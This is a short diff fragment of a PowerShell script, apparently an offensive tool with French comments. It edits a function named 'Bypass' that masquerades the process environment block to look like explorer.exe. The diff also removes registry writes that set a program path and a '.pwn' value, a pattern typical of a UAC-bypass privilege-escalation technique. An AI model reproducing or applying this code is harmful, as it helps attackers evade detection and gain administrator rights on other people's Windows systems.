@@ -270,12 +270,7 @@ function Bypass {
         # Masquerade the PEB to make the process appear as explorer.exe
         Masquerade-PEB
 
-        # Crée les clés et définit les valeurs.
-        New-Item -Path $regPath1 -Force | Out-Null
-        Set-ItemProperty -Path $regPath1 -Name "(default)" -Value $program -Force
 
-        New-Item -Path $regPath2 -Force | Out-Null
-        Set-ItemProperty -Path $regPath2 -Name "(default)" -Value ".pwn" -Force
 
         # Attends un court instant pour permettre l'exécution.
         Start-Sleep -Seconds 3
